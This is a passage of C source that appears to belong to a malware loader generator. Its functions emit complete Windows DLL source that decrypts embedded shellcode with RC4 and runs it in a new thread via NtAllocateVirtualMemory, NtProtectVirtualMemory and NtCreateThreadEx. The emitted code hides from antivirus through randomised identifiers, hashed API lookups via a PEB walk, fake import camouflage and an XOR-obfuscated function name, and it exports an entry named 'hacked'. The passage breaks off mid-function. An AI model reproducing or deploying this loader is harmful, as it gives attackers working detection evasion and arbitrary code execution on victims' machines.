    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];
    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names for APIs
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtAllocateVirtualMemory_name[9], pNtProtectVirtualMemory_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pNtDelayExecution_name[9];
    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtAllocateVirtualMemory_name, sizeof(pNtAllocateVirtualMemory_name));
    generate_random_string(pNtProtectVirtualMemory_name, sizeof(pNtProtectVirtualMemory_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntallocatevirtualmemory_hash_name[11];
    char ntprotectvirtualmemory_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11];
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntallocatevirtualmemory_hash_name, sizeof(ntallocatevirtualmemory_hash_name));
    generate_random_string(ntprotectvirtualmemory_hash_name, sizeof(ntprotectvirtualmemory_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtAllocateVirtualMemory_typedef[12], NtProtectVirtualMemory_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char NtDelayExecution_typedef[12];
    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtAllocateVirtualMemory_typedef, sizeof(NtAllocateVirtualMemory_typedef));
    generate_random_string(NtProtectVirtualMemory_typedef, sizeof(NtProtectVirtualMemory_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];
    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0;\n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define %s               0x5251037A\n"
        "#define %s               0xA5E086A2\n"
        "#define %s           0x0B37D3B9\n"
        "#define %s           0x504D6BF5\n"
        "#define %s           0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s           0xF20D7F2A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s           0xB9D893EC\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char hpb[] = {%s};\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RCG(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char had[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)hpb, sizeof(hpb), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(had), hpb);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID %s() {\n"
        "    HANDLE hThread = NULL;\n"
        "    PVOID pAddress = NULL;\n"
        "    DWORD old = 0;\n"
        "    SIZE_T sPayloadSize = sizeof(%s);\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE hnd = %s(%s);\n"
        "    %s p%s = (%s)%s(hnd, %s);\n"
        "    %s p%s = (%s)%s(hnd, %s);\n"
        "    %s p%s = (%s)%s(hnd, %s);\n"
        "    %s p%s = (%s)%s(hnd, %s);\n"
        "    %s p%s = (%s)%s(hnd, %s);\n"
        "    p%s((HANDLE)-1, &pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
        "    memcpy(pAddress, %s, sPayloadSize);\n"
        "    RCG(HINT_BYTE, %s, pAddress, sizeof(%s), sPayloadSize);\n"
        "    p%s((HANDLE)-1, &pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &old);\n"
        "    p%s(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, 0, 0, 0, 0, 0);\n"
        "    p%s(hThread, FALSE, &timeout);\n"
        "    p%s(hThread);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID run() {\n"
        "    %s();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "    return 0;\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call) {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        GetProcAddress_typedef,
        NtAllocateVirtualMemory_typedef,
        NtProtectVirtualMemory_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        NtDelayExecution_typedef,
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        ntdll_hash_name,
        kernel32_hash_name,
        ntallocatevirtualmemory_hash_name,
        ntprotectvirtualmemory_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        random_obf_func,
        xkey, obfuscated_fun,
        random_payload_name, shellcodeArray,
        random_key_name, keyArray, hint,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_inject_func,
        random_payload_name,
        random_getmodule_name, ntdll_hash_name,
        NtAllocateVirtualMemory_typedef, pNtAllocateVirtualMemory_name, NtAllocateVirtualMemory_typedef, random_getproc_name, ntallocatevirtualmemory_hash_name,
        NtProtectVirtualMemory_typedef, pNtProtectVirtualMemory_name, NtProtectVirtualMemory_typedef, random_getproc_name, ntprotectvirtualmemory_hash_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        NtClose_typedef, pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        pNtAllocateVirtualMemory_name,
        random_payload_name, random_key_name, random_key_name,
        pNtProtectVirtualMemory_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_inject_func
    );
}
void obf_6_API_stompping(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];
    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names for APIs
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtProtectVirtualMemory_name[9], pNtCreateThreadEx_name[9];
    char pNtWaitForSingleObject_name[9], pNtClose_name[9], pNtDelayExecution_name[9];
    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtProtectVirtualMemory_name, sizeof(pNtProtectVirtualMemory_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntprotectvirtualmemory_hash_name[12];
    char ntwaitforsingleobject_hash_name[12], ntcreatethreadex_hash_name[11];
    char ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11], messageboxa_hash_name[11];
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntprotectvirtualmemory_hash_name, sizeof(ntprotectvirtualmemory_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));
    generate_random_string(messageboxa_hash_name, sizeof(messageboxa_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtProtectVirtualMemory_typedef[12], NtCreateThreadEx_typedef[12];
    char NtWaitForSingleObject_typedef[12], NtClose_typedef[12], NtDelayExecution_typedef[12];
    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtProtectVirtualMemory_typedef, sizeof(NtProtectVirtualMemory_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload, ProtectedKey, and user32
    char random_payload_name[15], random_key_name[15], random_user32_name[15];
    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));
    generate_random_string(random_user32_name, sizeof(random_user32_name));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* obfuscated_user32 = obf("user32.dll", xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s               0x5251037A\n"
        "#define %s               0xA5E086A2\n"
        "#define %s           0x504D6BF5\n"
        "#define %s           0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s           0xF20D7F2A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s           0xB9D893EC\n"
        "#define %s           0x4A096AA1\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFuio[] = {%s};\n"
        "char %s[] = {%s};\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
